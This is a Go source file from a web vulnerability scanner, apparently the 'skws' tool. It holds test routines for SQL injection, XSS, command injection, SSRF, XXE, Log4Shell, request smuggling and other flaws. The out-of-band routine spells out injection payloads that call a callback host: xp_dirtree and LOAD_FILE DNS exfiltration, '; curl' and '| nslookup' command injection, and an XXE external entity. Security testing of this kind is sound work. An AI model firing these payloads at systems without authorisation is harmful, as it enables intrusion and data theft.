package scanner

import (
	"context"
	"fmt"
	"strings"
	"time"

	"github.com/swiss-knife-for-web-security/skws/internal/core"
	"net/url"

	"github.com/swiss-knife-for-web-security/skws/internal/detection/auth"
	"github.com/swiss-knife-for-web-security/skws/internal/detection/cloud"
	"github.com/swiss-knife-for-web-security/skws/internal/detection/cmdi"
	"github.com/swiss-knife-for-web-security/skws/internal/detection/cors"
	"github.com/swiss-knife-for-web-security/skws/internal/detection/crlf"
	"github.com/swiss-knife-for-web-security/skws/internal/detection/csvinj"
	"github.com/swiss-knife-for-web-security/skws/internal/detection/csti"
	"github.com/swiss-knife-for-web-security/skws/internal/detection/exposure"
	"github.com/swiss-knife-for-web-security/skws/internal/detection/fileupload"
	"github.com/swiss-knife-for-web-security/skws/internal/detection/graphql"
	"github.com/swiss-knife-for-web-security/skws/internal/detection/headerinj"
	"github.com/swiss-knife-for-web-security/skws/internal/detection/idor"
	"github.com/swiss-knife-for-web-security/skws/internal/detection/jndi"
	"github.com/swiss-knife-for-web-security/skws/internal/detection/ldap"
	"github.com/swiss-knife-for-web-security/skws/internal/detection/loginj"
	"github.com/swiss-knife-for-web-security/skws/internal/detection/lfi"
	"github.com/swiss-knife-for-web-security/skws/internal/detection/nosql"
	"github.com/swiss-knife-for-web-security/skws/internal/detection/oob"
	"github.com/swiss-knife-for-web-security/skws/internal/detection/pathnorm"
	"github.com/swiss-knife-for-web-security/skws/internal/detection/racecond"
	"github.com/swiss-knife-for-web-security/skws/internal/detection/redirect"
	"github.com/swiss-knife-for-web-security/skws/internal/detection/rfi"
	"github.com/swiss-knife-for-web-security/skws/internal/detection/secheaders"
	"github.com/swiss-knife-for-web-security/skws/internal/detection/ssrf"
	"github.com/swiss-knife-for-web-security/skws/internal/detection/ssti"
	"github.com/swiss-knife-for-web-security/skws/internal/detection/storageinj"
	"github.com/swiss-knife-for-web-security/skws/internal/detection/subtakeover"
	"github.com/swiss-knife-for-web-security/skws/internal/detection/verbtamper"
	tlsdetect "github.com/swiss-knife-for-web-security/skws/internal/detection/tls"
	"github.com/swiss-knife-for-web-security/skws/internal/detection/xpath"
	"github.com/swiss-knife-for-web-security/skws/internal/detection/xss"
	"github.com/swiss-knife-for-web-security/skws/internal/detection/xxe"
	"github.com/swiss-knife-for-web-security/skws/internal/http"
	"github.com/swiss-knife-for-web-security/skws/internal/payloads/sqli"
)

// testSQLiWithClient tests a parameter for SQL injection using the internal detector and provided client.
func (s *InternalScanner) testSQLiWithClient(ctx context.Context, targetURL string, param core.Parameter, method string, client *http.Client) []*core.Finding {
	var findings []*core.Finding
	paramName := param.Name

	if s.config.Verbose {
		fmt.Printf("[*] Testing SQLi on param '%s'...\n", paramName)
	}

	// Get payloads from the payloads package
	payloads := sqli.GetPayloads(sqli.Generic)
	if s.config.IncludeWAFBypass {
		payloads = append(payloads, sqli.GetWAFBypassPayloads(sqli.Generic)...)
	}

	// Limit payloads
	if len(payloads) > s.config.MaxPayloadsPerParam {
		payloads = payloads[:s.config.MaxPayloadsPerParam]
	}

	if s.config.Verbose {
		fmt.Printf("[*] Testing %d SQLi payloads...\n", len(payloads))
	}

	// Test each payload
	testedCount := 0
	for _, payload := range payloads {
		select {
		case <-ctx.Done():
			if s.config.Verbose {
				fmt.Printf("[!] SQLi test canceled by context\n")
			}
			return findings
		default:
		}

		// Send payload
		resp, err := client.SendPayload(ctx, targetURL, paramName, payload.Value, method)
		if err != nil {
			continue
		}
		testedCount++

		// Analyze response for SQLi indicators
		analysis := s.sqliDetector.AnalyzeResponse(resp.Body)
		if analysis.IsVulnerable {
			if s.config.Verbose {
				fmt.Printf("[+] SQLi FOUND in '%s' with payload: %s\n", paramName, payload.Value[:min(30, len(payload.Value))])
			}
			finding := core.NewFinding("SQL Injection", core.SeverityCritical)
			finding.URL = targetURL
			finding.Parameter = paramName
			finding.Description = fmt.Sprintf("%s SQL Injection vulnerability detected in '%s' parameter (Database: %s)",
				analysis.DetectionType, paramName, analysis.DatabaseType)
			finding.Evidence = fmt.Sprintf("Payload: %s\nEvidence: %s", payload.Value, analysis.Evidence)
			finding.Tool = "internal-sqli-detector"
			finding.Remediation = "Use parameterized queries or prepared statements. Never concatenate user input into SQL queries."

			finding.WithOWASPMapping(
				[]string{"WSTG-INPV-05"},
				[]string{"A03:2025"},
				[]string{"CWE-89"},
			)

			findings = append(findings, finding)
			// Stop after first finding for this parameter
			break
		}
	}

	if s.config.Verbose {
		fmt.Printf("[*] SQLi test complete: tested %d payloads, found %d vulns\n", testedCount, len(findings))
	}

	return findings
}

// testXSS tests a parameter for XSS using the internal detector.
func (s *InternalScanner) testXSS(ctx context.Context, targetURL string, param core.Parameter, method string) []*core.Finding {
	result, err := s.xssDetector.Detect(ctx, targetURL, param.Name, method, xss.DetectOptions{
		MaxPayloads:      s.config.MaxPayloadsPerParam,
		IncludeWAFBypass: s.config.IncludeWAFBypass,
		Timeout:          s.config.RequestTimeout,
	})

	if err != nil || !result.Vulnerable {
		return nil
	}

	return result.Findings
}

// testOOBWithClient tests a parameter using out-of-band techniques with the provided client.
func (s *InternalScanner) testOOBWithClient(ctx context.Context, targetURL string, param core.Parameter, method string, client *http.Client) []*core.Finding {
	if s.oobClient == nil {
		return nil
	}

	var findings []*core.Finding

	// Generate OOB payloads for different vulnerability types
	oobPayloads := []struct {
		payloadType string
		builder     func(url string) string
	}{
		{
			payloadType: oob.PayloadTypeSQLi,
			builder: func(url string) string {
				// Multiple SQLi OOB techniques
				return fmt.Sprintf("'; EXEC master..xp_dirtree '\\\\%s\\x'; --", url)
			},
		},
		{
			payloadType: oob.PayloadTypeSQLi,
			builder: func(url string) string {
				// MySQL DNS exfil
				return fmt.Sprintf("' AND LOAD_FILE(CONCAT('\\\\\\\\', (SELECT version()), '.%s\\\\a'))-- ", url)
			},
		},
		{
			payloadType: oob.PayloadTypeSSRF,
			builder: func(url string) string {
				return "http://" + url
			},
		},
		{
			payloadType: oob.PayloadTypeRCE,
			builder: func(url string) string {
				return fmt.Sprintf("; curl http://%s", url)
			},
		},
		{
			payloadType: oob.PayloadTypeRCE,
			builder: func(url string) string {
				return fmt.Sprintf("| nslookup %s", url)
			},
		},
		{
			payloadType: oob.PayloadTypeXXE,
			builder: func(url string) string {
				return fmt.Sprintf(`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://%s">]><foo>&xxe;</foo>`, url)
			},
		},
	}

	paramName := param.Name

	for _, p := range oobPayloads {
		select {
		case <-ctx.Done():
			return findings
		default:
		}

		payload := s.oobClient.GeneratePayload(p.payloadType)
		testPayload := p.builder(payload.DNSPayload())

		// Send payload — errors are expected for malformed payloads, continue to poll for interactions
		if _, err := client.SendPayload(ctx, targetURL, paramName, testPayload, method); err != nil && s.config.Verbose {
			fmt.Printf("[!] OOB payload send failed for %s: %v\n", p.payloadType, err)
		}
	}

	// Poll for interactions with a reasonable timeout
	pollCtx, cancel := context.WithTimeout(ctx, s.config.OOBPollTimeout)
	defer cancel()

	interactions := s.oobClient.PollWithTimeout(pollCtx, 5*time.Second)

	for _, interaction := range interactions {
		finding := core.NewFinding(
			fmt.Sprintf("Blind %s via OOB", strings.ToUpper(interaction.PayloadType)),
			core.SeverityCritical,
		)
		finding.URL = targetURL
		finding.Parameter = paramName
		finding.Description = fmt.Sprintf("Out-of-band interaction detected (%s) from %s",
			interaction.Protocol, interaction.RemoteAddr)
		finding.Evidence = interaction.String()
		finding.Tool = "internal-oob"

		// Add OWASP mappings based on payload type
		switch interaction.PayloadType {
		case oob.PayloadTypeSQLi:
			finding.WithOWASPMapping([]string{"WSTG-INPV-05"}, []string{"A03:2025"}, []string{"CWE-89"})
		case oob.PayloadTypeSSRF:
			finding.WithOWASPMapping([]string{"WSTG-INPV-19"}, []string{"A10:2025"}, []string{"CWE-918"})
		case oob.PayloadTypeRCE:
			finding.WithOWASPMapping([]string{"WSTG-INPV-12"}, []string{"A03:2025"}, []string{"CWE-78"})
		case oob.PayloadTypeXXE:
			finding.WithOWASPMapping([]string{"WSTG-INPV-07"}, []string{"A05:2025"}, []string{"CWE-611"})
		}

		findings = append(findings, finding)
	}

	return findings
}

// testCMDI tests a parameter for Command Injection using the internal detector.
func (s *InternalScanner) testCMDI(ctx context.Context, targetURL string, param core.Parameter, method string) []*core.Finding {
	if s.config.Verbose {
		fmt.Printf("[*] Testing CMDI on param '%s'...\n", param.Name)
	}

	result, err := s.cmdiDetector.Detect(ctx, targetURL, param.Name, method, cmdi.DetectOptions{
		MaxPayloads:      s.config.MaxPayloadsPerParam,
		IncludeWAFBypass: s.config.IncludeWAFBypass,
		Timeout:          s.config.RequestTimeout,
		EnableTimeBased:  true,
		TimeBasedDelay:   5 * time.Second,
	})

	if err != nil || !result.Vulnerable {
		return nil
	}

	return result.Findings
}

// testSSRF tests a parameter for SSRF using the internal detector.
func (s *InternalScanner) testSSRF(ctx context.Context, targetURL string, param core.Parameter, method string) []*core.Finding {
	if s.config.Verbose {
		fmt.Printf("[*] Testing SSRF on param '%s'...\n", param.Name)
	}

	result, err := s.ssrfDetector.Detect(ctx, targetURL, param.Name, method, ssrf.DetectOptions{
		MaxPayloads:      s.config.MaxPayloadsPerParam,
		IncludeWAFBypass: s.config.IncludeWAFBypass,
		Timeout:          s.config.RequestTimeout,
	})

	if err != nil || !result.Vulnerable {
		return nil
	}

	return result.Findings
}

// testLFI tests a parameter for LFI/Path Traversal using the internal detector.
func (s *InternalScanner) testLFI(ctx context.Context, targetURL string, param core.Parameter, method string) []*core.Finding {
	if s.config.Verbose {
		fmt.Printf("[*] Testing LFI on param '%s'...\n", param.Name)
	}

	result, err := s.lfiDetector.Detect(ctx, targetURL, param.Name, method, lfi.DetectOptions{
		MaxPayloads:      s.config.MaxPayloadsPerParam,
		IncludeWAFBypass: s.config.IncludeWAFBypass,
		Timeout:          s.config.RequestTimeout,
		TestWrappers:     true,
	})

	if err != nil || !result.Vulnerable {
		return nil
	}

	return result.Findings
}

// testXXEInParam tests a parameter for XXE using the internal detector.
func (s *InternalScanner) testXXEInParam(ctx context.Context, targetURL string, param core.Parameter, method string) []*core.Finding {
	if s.config.Verbose {
		fmt.Printf("[*] Testing XXE on param '%s'...\n", param.Name)
	}

	result, err := s.xxeDetector.DetectInParameter(ctx, targetURL, param.Name, method, xxe.DetectOptions{
		MaxPayloads: s.config.MaxPayloadsPerParam,
		Timeout:     s.config.RequestTimeout,
	})

	if err != nil || !result.Vulnerable {
		return nil
	}

	return result.Findings
}

// testNoSQL tests a parameter for NoSQL Injection using the internal detector.
func (s *InternalScanner) testNoSQL(ctx context.Context, targetURL string, param core.Parameter, method string) []*core.Finding {
	if s.config.Verbose {
		fmt.Printf("[*] Testing NoSQL Injection on param '%s'...\n", param.Name)
	}

	result, err := s.nosqlDetector.Detect(ctx, targetURL, param.Name, method, nosql.DetectOptions{
		MaxPayloads:      s.config.MaxPayloadsPerParam,
		IncludeWAFBypass: s.config.IncludeWAFBypass,
		Timeout:          s.config.RequestTimeout,
	})

	if err != nil || !result.Vulnerable {
		return nil
	}

	return result.Findings
}

// testSSTI tests a parameter for Server-Side Template Injection.
func (s *InternalScanner) testSSTI(ctx context.Context, targetURL string, param core.Parameter, method string) []*core.Finding {
	if s.config.Verbose {
		fmt.Printf("[*] Testing SSTI on param '%s'...\n", param.Name)
	}

	result, err := s.sstiDetector.Detect(ctx, targetURL, param.Name, method, ssti.DetectOptions{
		MaxPayloads:      s.config.MaxPayloadsPerParam,
		IncludeWAFBypass: s.config.IncludeWAFBypass,
		Timeout:          s.config.RequestTimeout,
		TestAllEngines:   true,
	})

	if err != nil || !result.Vulnerable {
		return nil
	}

	return result.Findings
}

// testIDOR tests for Insecure Direct Object Reference vulnerabilities.
func (s *InternalScanner) testIDOR(ctx context.Context, targetURL string) []*core.Finding {
	if s.config.Verbose {
		fmt.Printf("[*] Testing IDOR on '%s'...\n", targetURL)
	}

	result, err := s.idorDetector.Detect(ctx, targetURL, idor.DetectOptions{
		MaxRequests: s.config.MaxPayloadsPerParam,
		Timeout:     s.config.RequestTimeout,
	})

	if err != nil || !result.Vulnerable {
		return nil
	}

	return result.Findings
}

// testRedirect tests a parameter for Open Redirect vulnerabilities.
func (s *InternalScanner) testRedirect(ctx context.Context, targetURL string, param core.Parameter, method string) []*core.Finding {
	if s.config.Verbose {
		fmt.Printf("[*] Testing Open Redirect on param '%s'...\n", param.Name)
	}

	result, err := s.redirectDetector.Detect(ctx, targetURL, param.Name, method, redirect.DetectOptions{
		MaxPayloads:   s.config.MaxPayloadsPerParam,
		Timeout:       s.config.RequestTimeout,
		IncludeBypass: s.config.IncludeWAFBypass,
	})

	if err != nil || !result.Vulnerable {
		return nil
	}

	return result.Findings
}

// testCORS tests for CORS misconfigurations.
func (s *InternalScanner) testCORS(ctx context.Context, targetURL string) []*core.Finding {
	if s.config.Verbose {
		fmt.Printf("[*] Testing CORS on '%s'...\n", targetURL)
	}

	result, err := s.corsDetector.Detect(ctx, targetURL, cors.DetectOptions{
		Timeout:         s.config.RequestTimeout,
		TestCredentials: true,
		TestPreflight:   true,
	})

	if err != nil || !result.Vulnerable {
		return nil
	}

	return result.Findings
}

// testCRLF tests a parameter for CRLF Injection vulnerabilities.
func (s *InternalScanner) testCRLF(ctx context.Context, targetURL string, param core.Parameter, method string) []*core.Finding {
	if s.config.Verbose {
		fmt.Printf("[*] Testing CRLF Injection on param '%s'...\n", param.Name)
	}

	result, err := s.crlfDetector.Detect(ctx, targetURL, param.Name, method, crlf.DetectOptions{
		MaxPayloads:         s.config.MaxPayloadsPerParam,
		Timeout:             s.config.RequestTimeout,
		TestHeaderInjection: true,
		TestResponseSplit:   true,
		IncludeAllEncodings: s.config.IncludeWAFBypass,
	})

	if err != nil || !result.Vulnerable {
		return nil
	}

	return result.Findings
}

// testJWT tests JWT tokens for vulnerabilities.
// Note: This requires JWT tokens to be extracted from the target first.
func (s *InternalScanner) testJWT(ctx context.Context, token string) []*core.Finding {
	if s.config.Verbose {
		fmt.Printf("[*] Testing JWT token for vulnerabilities...\n")
	}

	result, err := s.jwtDetector.Detect(ctx, token, nil)
	if err != nil || !result.HasVulnerabilities() {
		return nil
	}

	var findings []*core.Finding
	for _, jwtFinding := range result.Findings {
		findings = append(findings, jwtFinding.ToCoreFindings(""))
	}

	return findings
}

// testLDAP tests a parameter for LDAP Injection using the internal detector.
func (s *InternalScanner) testLDAP(ctx context.Context, targetURL string, param core.Parameter, method string) []*core.Finding {
	if s.config.Verbose {
		fmt.Printf("[*] Testing LDAP Injection on param '%s'...\n", param.Name)
	}

	result, err := s.ldapDetector.Detect(ctx, targetURL, param.Name, method, ldap.DetectOptions{
		MaxPayloads:      s.config.MaxPayloadsPerParam,
		IncludeWAFBypass: s.config.IncludeWAFBypass,
		Timeout:          s.config.RequestTimeout,
	})

	if err != nil || !result.Vulnerable {
		return nil
	}

	return result.Findings
}

// testXPath tests a parameter for XPath Injection using the internal detector.
func (s *InternalScanner) testXPath(ctx context.Context, targetURL string, param core.Parameter, method string) []*core.Finding {
	if s.config.Verbose {
		fmt.Printf("[*] Testing XPath Injection on param '%s'...\n", param.Name)
	}

	result, err := s.xpathDetector.Detect(ctx, targetURL, param.Name, method, xpath.DetectOptions{
		MaxPayloads:      s.config.MaxPayloadsPerParam,
		IncludeWAFBypass: s.config.IncludeWAFBypass,
		Timeout:          s.config.RequestTimeout,
	})

	if err != nil || !result.Vulnerable {
		return nil
	}

	return result.Findings
}

// testHeaderInj tests a parameter for HTTP Header Injection using the internal detector.
func (s *InternalScanner) testHeaderInj(ctx context.Context, targetURL string, param core.Parameter, method string) []*core.Finding {
	if s.config.Verbose {
		fmt.Printf("[*] Testing Header Injection on param '%s'...\n", param.Name)
	}

	result, err := s.headerInjDetector.Detect(ctx, targetURL, param.Name, method, headerinj.DetectOptions{
		MaxPayloads:      s.config.MaxPayloadsPerParam,
		IncludeWAFBypass: s.config.IncludeWAFBypass,
		Timeout:          s.config.RequestTimeout,
	})

	if err != nil || !result.Vulnerable {
		return nil
	}

	return result.Findings
}

// testCSTI tests a parameter for Client-Side Template Injection using the internal detector.
func (s *InternalScanner) testCSTI(ctx context.Context, targetURL string, param core.Parameter, method string) []*core.Finding {
	if s.config.Verbose {
		fmt.Printf("[*] Testing CSTI on param '%s'...\n", param.Name)
	}

	result, err := s.cstiDetector.Detect(ctx, targetURL, param.Name, method, csti.DetectOptions{
		MaxPayloads:      s.config.MaxPayloadsPerParam,
		IncludeWAFBypass: s.config.IncludeWAFBypass,
		Timeout:          s.config.RequestTimeout,
	})

	if err != nil || !result.Vulnerable {
		return nil
	}

	return result.Findings
}

// testRFI tests a parameter for Remote File Inclusion using the internal detector.
func (s *InternalScanner) testRFI(ctx context.Context, targetURL string, param core.Parameter, method string) []*core.Finding {
	if s.config.Verbose {
		fmt.Printf("[*] Testing RFI on param '%s'...\n", param.Name)
	}

	result, err := s.rfiDetector.Detect(ctx, targetURL, param.Name, method, rfi.DetectOptions{
		MaxPayloads:      s.config.MaxPayloadsPerParam,
		IncludeWAFBypass: s.config.IncludeWAFBypass,
		Timeout:          s.config.RequestTimeout,
	})

	if err != nil || !result.Vulnerable {
		return nil
	}

	return result.Findings
}

// testJNDI tests for JNDI/Log4Shell vulnerabilities using the internal detector.
func (s *InternalScanner) testJNDI(ctx context.Context, targetURL string) []*core.Finding {
	if s.config.Verbose {
		fmt.Printf("[*] Testing JNDI/Log4Shell on '%s'...\n", targetURL)
	}

	result, err := s.jndiDetector.Detect(ctx, targetURL, jndi.DetectOptions{
		MaxPayloads:      s.config.MaxPayloadsPerParam,
		IncludeWAFBypass: s.config.IncludeWAFBypass,
		Timeout:          s.config.RequestTimeout,
		TestHeaders:      true,
		TestParams:       true,
	})

	if err != nil || !result.Vulnerable {
		return nil
	}

	return result.Findings
}

// testSecHeaders tests for missing or insecure HTTP security headers.
func (s *InternalScanner) testSecHeaders(ctx context.Context, targetURL string) []*core.Finding {
	if s.config.Verbose {
		fmt.Printf("[*] Testing security headers on '%s'...\n", targetURL)
	}

	result, err := s.secHeadersDetector.Detect(ctx, targetURL, secheaders.DetectOptions{
		Timeout:             s.config.RequestTimeout,
		CheckRequired:       true,
		CheckOptional:       true,
		CheckInfoDisclosure: true,
	})

	if err != nil || !result.Vulnerable {
		return nil
	}

	return result.Findings
}

// testExposure tests for exposed sensitive files and directories.
func (s *InternalScanner) testExposure(ctx context.Context, targetURL string) []*core.Finding {
	if s.config.Verbose {
		fmt.Printf("[*] Testing sensitive file exposure on '%s'...\n", targetURL)
	}

	result, err := s.exposureDetector.Detect(ctx, targetURL, exposure.DetectOptions{
		Timeout:       s.config.RequestTimeout,
		ContinueOnHit: true,
	})

	if err != nil || !result.Vulnerable {
		return nil
	}

	return result.Findings
}

// testCloud tests for cloud storage misconfigurations.
func (s *InternalScanner) testCloud(ctx context.Context, targetURL string) []*core.Finding {
	if s.config.Verbose {
		fmt.Printf("[*] Testing cloud storage misconfigurations for '%s'...\n", targetURL)
	}

	parsedURL, err := url.Parse(targetURL)
	if err != nil {
		return nil
	}

	result, err := s.cloudDetector.Detect(ctx, parsedURL.Hostname(), cloud.DetectOptions{
		Timeout: s.config.RequestTimeout,
	})

	if err != nil || !result.Vulnerable {
		return nil
	}

	return result.Findings
}

// testSubTakeover tests for subdomain takeover vulnerabilities.
func (s *InternalScanner) testSubTakeover(ctx context.Context) []*core.Finding {
	if s.config.Verbose {
		fmt.Printf("[*] Testing subdomain takeover (%d subdomains)...\n", len(s.config.Subdomains))
	}

	result, err := s.subTakeoverDetector.Detect(ctx, s.config.Subdomains, subtakeover.DetectOptions{
		Timeout: s.config.RequestTimeout,
	})

	if err != nil || !result.Vulnerable {
		return nil
	}

	return result.Findings
}

// testTLS tests for TLS/SSL vulnerabilities and misconfigurations.
func (s *InternalScanner) testTLS(ctx context.Context, targetURL string) []*core.Finding {
	if s.config.Verbose {
		fmt.Printf("[*] Testing TLS configuration on '%s'...\n", targetURL)
	}

	result, err := s.tlsAnalyzer.Analyze(ctx, targetURL, tlsdetect.AnalyzeOptions{
		Timeout:          s.config.RequestTimeout,
		CheckCertificate: true,
		CheckProtocol:    true,
		CertExpiryDays:   30,
		RequireHSTS:      true,
	})

	if err != nil || !result.Vulnerable {
		return nil
	}

	return result.Findings
}

// testAuth tests for authentication vulnerabilities.
func (s *InternalScanner) testAuth(ctx context.Context, loginURL string) []*core.Finding {
	if s.config.Verbose {
		fmt.Printf("[*] Testing authentication on '%s'...\n", loginURL)
	}

	var findings []*core.Finding

	// Test for default credentials
	result, err := s.authDetector.DetectDefaultCredentials(ctx, loginURL, auth.DetectOptions{
		Timeout: s.config.RequestTimeout,
	})
	if err == nil && result.Vulnerable {
		findings = append(findings, result.Findings...)
	}

	// Test for user enumeration
	result, err = s.authDetector.DetectUserEnumeration(ctx, loginURL, auth.DetectOptions{
		Timeout: s.config.RequestTimeout,
	})
	if err == nil && result.Vulnerable {
		findings = append(findings, result.Findings...)
	}

	// Test for missing rate limiting
	result, err = s.authDetector.DetectMissingRateLimit(ctx, loginURL, auth.DetectOptions{
		Timeout: s.config.RequestTimeout,
	})
	if err == nil && result.Vulnerable {
		findings = append(findings, result.Findings...)
	}

	return findings
}

// testGraphQL tests for GraphQL-specific vulnerabilities.
func (s *InternalScanner) testGraphQL(ctx context.Context, targetURL string) []*core.Finding {
	if s.config.Verbose {
		fmt.Printf("[*] Testing GraphQL vulnerabilities on '%s'...\n", targetURL)
	}

	// Discover GraphQL endpoints first
	endpoints, err := s.graphqlDetector.DiscoverEndpoints(ctx, targetURL)
	if err != nil || len(endpoints) == 0 {
		// Try direct detection on the target URL
		result, detectErr := s.graphqlDetector.Detect(ctx, targetURL, graphql.DetectOptions{
			Timeout: s.config.RequestTimeout,
		})
		if detectErr != nil || !result.IsGraphQL {
			return nil
		}
		return result.Findings
	}

	var findings []*core.Finding
	for _, endpoint := range endpoints {
		result, detectErr := s.graphqlDetector.Detect(ctx, endpoint, graphql.DetectOptions{
			Timeout: s.config.RequestTimeout,
		})
		if detectErr != nil || !result.IsGraphQL {
			continue
		}
		findings = append(findings, result.Findings...)
	}

	return findings
}

// testSmuggling tests for HTTP request smuggling vulnerabilities.
func (s *InternalScanner) testSmuggling(ctx context.Context, targetURL string) []*core.Finding {
	if s.config.Verbose {
		fmt.Printf("[*] Testing HTTP smuggling on '%s'...\n", targetURL)
	}

	parsedURL, err := url.Parse(targetURL)
	if err != nil {
		return nil
	}

	target := parsedURL.Host
	path := parsedURL.Path
	if path == "" {
		path = "/"
	}

	results := s.smugglingDetector.Detect(ctx, target, path)

	var findings []*core.Finding
	for _, r := range results {
		if !r.Vulnerable {
			continue
		}

		finding := core.NewFinding("HTTP Request Smuggling", core.SeverityHigh)
		finding.URL = targetURL
		finding.Description = fmt.Sprintf("HTTP Request Smuggling (%s) detected with %.0f%% confidence",
			r.Type, r.Confidence*100)
		finding.Evidence = r.Evidence
		finding.Tool = "internal-smuggling"
		finding.Remediation = "Ensure consistent interpretation of Content-Length and Transfer-Encoding headers between frontend and backend servers."
		finding.WithOWASPMapping(
			[]string{"WSTG-INPV-15"},
			[]string{"A05:2025"},
			[]string{"CWE-444"},
		)
		findings = append(findings, finding)
	}

	return findings
}

// testStorageInj tests for client-side storage injection vulnerabilities.
func (s *InternalScanner) testStorageInj(ctx context.Context, targetURL string) []*core.Finding {
	if s.config.Verbose {
		fmt.Printf("[*] Testing storage injection on '%s'...\n", targetURL)
	}

	result, err := s.storageInjDetector.Detect(ctx, targetURL, storageinj.DetectOptions{
		Timeout:        s.config.RequestTimeout,
		CheckSensitive: true,
		MaxPayloads:    s.config.MaxPayloadsPerParam,
	})

	if err != nil {
		if s.config.Verbose {
			fmt.Printf("[!] Storage injection test error: %v\n", err)
		}
		return nil
	}
	if !result.Vulnerable {
		return nil
	}

	return result.Findings
}

// testLogInj tests for log injection vulnerabilities via HTTP headers.
func (s *InternalScanner) testLogInj(ctx context.Context, targetURL string) []*core.Finding {
	if s.config.Verbose {
		fmt.Printf("[*] Testing log injection on '%s'...\n", targetURL)
	}

	result, err := s.logInjDetector.Detect(ctx, targetURL, "", "GET", loginj.DefaultOptions())
	if err != nil {
		if s.config.Verbose {
			fmt.Printf("[!] Log injection test error: %v\n", err)
		}
		return nil
	}
	if !result.Vulnerable {
		return nil
	}

	return result.Findings
}

// testFileUpload tests for file upload vulnerabilities.
func (s *InternalScanner) testFileUpload(ctx context.Context, targetURL string) []*core.Finding {
	if s.config.Verbose {
		fmt.Printf("[*] Testing file upload on '%s'...\n", targetURL)
	}

	result, err := s.fileUploadDetector.Detect(ctx, targetURL, "", "POST", fileupload.DetectOptions{
		MaxPayloads:       s.config.MaxPayloadsPerParam,
		IncludeMIMEBypass: s.config.IncludeWAFBypass,
		IncludeDoubleExt:  true,
		IncludeNullByte:   true,
		Timeout:           s.config.RequestTimeout,
	})

	if err != nil {
		if s.config.Verbose {
			fmt.Printf("[!] File upload test error: %v\n", err)
		}
		return nil
	}
	if !result.Vulnerable {
		return nil
	}

	return result.Findings
}

// testVerbTamper tests for HTTP verb tampering bypass vulnerabilities.
func (s *InternalScanner) testVerbTamper(ctx context.Context, targetURL string) []*core.Finding {
	if s.config.Verbose {
		fmt.Printf("[*] Testing verb tampering on '%s'...\n", targetURL)
	}

	result, err := s.verbTamperDetector.Detect(ctx, targetURL, "", "GET", verbtamper.DetectOptions{
		MaxPayloads:          s.config.MaxPayloadsPerParam,
		IncludeOverrideTests: true,
		Timeout:              s.config.RequestTimeout,
	})

	if err != nil {
		if s.config.Verbose {
			fmt.Printf("[!] Verb tampering test error: %v\n", err)
		}
		return nil
	}
	if !result.Vulnerable {
		return nil
	}

	return result.Findings
}

// testPathNorm tests for path normalization bypass vulnerabilities.
func (s *InternalScanner) testPathNorm(ctx context.Context, targetURL string) []*core.Finding {
	if s.config.Verbose {
		fmt.Printf("[*] Testing path normalization on '%s'...\n", targetURL)
	}

	result, err := s.pathNormDetector.Detect(ctx, targetURL, "", "GET", pathnorm.DetectOptions{
		MaxPayloads: s.config.MaxPayloadsPerParam,
		Timeout:     s.config.RequestTimeout,
	})

	if err != nil {
		if s.config.Verbose {
			fmt.Printf("[!] Path normalization test error: %v\n", err)
		}
		return nil
	}
	if !result.Vulnerable {
		return nil
	}

	return result.Findings
}

// testRaceCond tests for race condition vulnerabilities.
func (s *InternalScanner) testRaceCond(ctx context.Context, targetURL string) []*core.Finding {
	if s.config.Verbose {
		fmt.Printf("[*] Testing race conditions on '%s'...\n", targetURL)
	}

	result, err := s.raceCondDetector.Detect(ctx, targetURL, "", "GET", racecond.DetectOptions{
		ConcurrentRequests: 10,
		Timeout:            s.config.RequestTimeout,
	})

	if err != nil {
		if s.config.Verbose {
			fmt.Printf("[!] Race condition test error: %v\n", err)
		}
		return nil
	}
	if !result.Vulnerable {
		return nil
	}

	return result.Findings
}

// testCSVInj tests a parameter for CSV/Formula Injection vulnerabilities.
func (s *InternalScanner) testCSVInj(ctx context.Context, targetURL string, param core.Parameter, method string) []*core.Finding {
	if s.config.Verbose {
		fmt.Printf("[*] Testing CSV injection on param '%s'...\n", param.Name)
	}

	result, err := s.csvInjDetector.Detect(ctx, targetURL, param.Name, method, csvinj.DetectOptions{
		MaxPayloads: s.config.MaxPayloadsPerParam,
		Timeout:     s.config.RequestTimeout,
	})

	if err != nil {
		if s.config.Verbose {
			fmt.Printf("[!] CSV injection test error: %v\n", err)
		}
		return nil
	}
	if !result.Vulnerable {
		return nil
	}

	return result.Findings
}
